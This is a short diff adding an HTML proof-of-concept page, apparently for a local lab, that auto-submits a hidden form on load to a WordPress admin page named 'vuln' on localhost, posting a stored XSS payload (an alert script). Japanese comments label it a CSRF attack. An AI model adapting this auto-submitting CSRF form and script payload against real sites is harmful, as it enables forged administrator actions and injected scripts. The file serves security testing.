@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="utf-8"><title>CSRF Attack</title></head>
+<body onload="document.forms[0].submit()">
+  <form action="http://localhost:10090/wp-admin/admin.php?page=vuln" method="POST">
+    <!-- Stored XSS ペイロードを自動投稿 -->
+    <input type="hidden" name="comment" value="<script>alert('CSRF')</script>">
+  </form>
+  <p>攻撃中…</p>
+</body>
+</html>
